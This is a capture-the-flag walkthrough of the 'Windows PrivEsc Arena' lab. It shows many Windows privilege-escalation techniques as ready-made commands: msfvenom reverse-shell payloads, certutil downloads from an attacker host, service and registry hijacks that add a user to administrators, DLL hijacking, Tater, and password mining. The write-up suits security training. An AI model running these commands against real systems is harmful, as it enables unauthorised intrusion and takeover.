> Windows PrivEsc Arena | The Cyber Mentor

## export IP=10.10.165.55

**NOTE : Port 3389 is open (RDP) and credentials are user:password321**

# Task 1 

Deploy the machine!!

# Task 2

Connect with RDP using the above credentials.  	

Open a command prompt and run 'net user'. Who is the other non-default user on the machine?

```
TCM
```

# Task 3 - Registry Escalation (Autorun)

Registry Escaltion : When a new service is registered with a system a new  key is created in the registry and it contains the binary path. Basically the admin only has the write access to this. But if a normal user has write permission over the registry he can priv. esc.

## Steps in RDP session

1. Type C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

**NOTE : autoruns is a microsoft sysinternal which displays the programs which automatically starts with the OS**

2. Click on the `Logon` tab.

3. From the result we find that `My Programs` is pointing to `C:\Program Files\Autorun Program\program.exe` 

4. Type `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`

**NOTE : accesschk is a microsoft sysinternal which allows admin to see what kind of access does users have to all kinds of files, dirs, services, etc.
Options : -w Only write access, -v verbose , -u suppress errors**

5. We find that `Everyone` user group has permission over `program.exe`

```
 Medium Mandatory Level (Default) [No-Write-Up]
 RW Everyone
       FILE_ALL_ACCESS
 RW NT AUTHORITY\SYSTEM
       FILE_ALL_ACCESS
 RW BUILTIN\Administrators
       FILE_ALL_ACCESS
```

## Exploit

Open msfconsole and start a handler and set payload windows/meterpreter/reverse_tcp.

# Create payload

msfvenom -p windows/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > program.exe

Move to Folder `C:\Program Files\Autorun Program` and copy the payload in there.

```
certutil.exe -urlcache -f http://$IP:8000/program.exe program.exe
```

**NOTE : Log off and log in as `TCM`:`Hacker123`**

We get the shell! . And we are in as `TCM-PC\TCM`.

# Task 4 - Registry Escalation (AlwaysInstallElevated)

## Steps to check if the functionality is turned on

AlwaysInstallElevated is a functionality that allows users to run an msi file ith elevated privileges.


1. Type `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`

2. AlwaysInstallElevated value must be 1.

3. Type `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`

4. AlwaysInstallElevated value must be 1.

## Exploit

Open msfconsole and start a handler and set payload windows/meterpreter/reverse_tcp.

# Create payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f msi > setup.msi

Upload it to the machine in C:\Temp location

```
certutil.exe -urlcache -f http://10.8.107.21:8000/setup.msi setup.msi
```

We are using `msiexec` here to execute the msi file. msiexec is a sysinternal for installing in command line.

`msiexec /quiet /qn /i C:\Temp\setup.msi` gives us the shell!!!

**NOTE : Options /quiet quiet-mode, /qn- No UI interaction, /i- normal installation**

# Task 5 - Service Escalation (Registry)

Flaws in permissions of registry entries. Windows stores local configuration info in registry under `HKLM\System\CurrentControlSet\Service`

## RDP Session

1. Open powershell and type the command `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`

**Options : Get-Acl - Gives us the access list of the file
fl - Format List**

2. Output

```
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\Cur
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl => This user has full control.
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;B
```

## Exploit

Copy the file `C:\Users\User\Desktop\Tools\Source\windows_service.c` to our local machine.

1. Edit the code in system section 

```
cmd.exe /k net localgroup administrators user /add

**Syntax : net user <username> /add**
```

2. x86_64-w64-mingw32-gcc windows_service.c -o x.exe 

3. Transfer x.exe to RDP session and place it in `C:\Temp`

4. In RDP session in command prompt type `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f`

**Syntax : REG ADD keyname (Path of subkey. Valid registry keys in Remote session is HKLM & HKU)
		   /v (valuename) specifies name for registry key to be added
           /t Type of registry key entries
           /d data
           /f add/delete an entry without prompting**

5. In cmd prompt , type `svc start regsvc`

6. POC : Type `net localgroup administartors`

```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the
computer/domain

Members

--------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```

# Task 6 - Service Escalation (Executable files)

When a service is created whose executable path contains spaces and isn't enclosed within quotes. That path allows us to have privilege escaltion if the service has that privilege.

## RDP session

1. Type the command `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Progarm Files\File Permissions Service"`

```
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS => Everyone has all access
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

## Exploit

1. In RDP session, transfer the `x.exe` in C:\Temp

2. cp /y x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

3. Restart the service. `sc start filepermsvc`

4. Now we have added the user. 

#POC

```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the
computer/domain

Members

--------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```
# Task 7 - Privilege Escalation (Startup Applications)

## RDP session

Open cmd and type `icacls.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start`

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
BUILTIN\Users:(F) => This user has full access
TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**NOTE : icacls.exe modifies NTFS file system permission**


# Exploit

Set up a handler in metasploit to catch the reverse shell.

Move x.exe to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

And log off and log in as `admin`

We get a reverse shell!!

# DLL Hijacking

When an application is looking for a dll to run then we place our own dll file instead the original one.

The Windows VM has dllhijackservice.exe and it requires hijackme.dll but doen't have it so we copy windows_dll.c into our Ubuntu Machine and edit it.

## Exploit

1. Open the windows_dll.c in text editor and add `cmd.exe /k net localgroup administrators user /add`

2. Compile the file `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`

3. Upload it to the Windows machine.

## RDP session

Place hijackme.dll in C:\Temp. Open cmd and type `sc stop dllsvc & sc start dllsvc`

POC : net localgroup administrators => gives us the user

# binPath

Modifying the service configuration to our malicious binary gives us privilege access.

**NOTE : daclsvc - when aprocess tries to access a securable object the system checks the list to check whether to grant permission or not**

## Checking for Vuln

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

```
daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

## Exploit

1. sc config daclsvc binpath= "net localgroup administartors user /add"

2. Start the service. `sc start daclsvc`

# Unquoted Path Service

## Checking for vuln

1. sc qc unquotedsvc 

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common
\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

## Creating payload

msfvenom -p windows/exec CMD='net localgroup administartors user /add' -f exe-service -o common.exe

## POC

sc start unquotedsvc

# Hot Poatato

The technique is a combination of two known windows issues like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

WPAD - Web Proxy Auto-Discovery is a protocol which is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods.

```
powershell.exe -nop -ep bypass
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

# Password Mining Escalation - Configuration Files

unattend.xml contains setting definitions and values to use during Windows Setup. Options include how to partition disks, where to find the Windows image that will be installed, and which product key to apply. You can also specify values that apply to the Windows installation, such as names of user accounts and display settings. 

```
            <AutoLogon>
                <Password>
                    <Value>cGFzc3dvcmQxMjM=</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>Admin</Username>
            </AutoLogon>
```

echo "cGFzc3dvcmQxMjM=" | base64 -d => `password123`

# Password Mining Escalation - Memory

## Metasploit

> use auxiliary/server/capture/http_basic
> set URIPATH x
> run

## RDP Session

Open IE and go to http://<IP>/x
Open cmd and type `taskmgr`
Select `iexplore.exe` and right click `Create Dump File`
Move `iexplore.DMP` in Ubuntu and run strings iexplore.DMP | grep "Authorization: Basic"

# Privilege Escalation - Kernel Exploits

## Establishing shell

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0

## Create payload

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f exe > shell.exe
Pass it to the Windows machine and run it

We have a shell!! Now background it.

## Detection and Exploitation

> run post/multi/recon/local_exploit_suggester

Suggests us `exploit/windows/local/ms16_014_wmi_recv_notif`

> use exploit exploit/windows/local/ms16_014_wmi_recv_notif
> set lport 1234
> set lhost tun0
> run
